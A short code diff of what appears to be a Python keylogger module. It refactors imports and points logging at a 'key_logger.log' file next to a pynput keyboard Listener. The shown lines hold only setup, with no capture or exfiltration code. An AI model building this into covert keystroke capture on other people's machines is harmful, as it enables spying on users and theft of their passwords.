@@ -1,14 +1,14 @@
 import logging
+import os
 import threading
-from shared_function import *
-import time
+from . import shared_function as sf
 from pynput.keyboard import Listener
 
 listener = None
 
 
 # setup logging
-logfile_path = os.path.join(ASSET_PATH, "key_logger.log")
+logfile_path = os.path.join(sf.ASSET_PATH, "key_logger.log")
 logging.basicConfig(filename=logfile_path,
                     filemode='w',
                     level=logging.DEBUG,
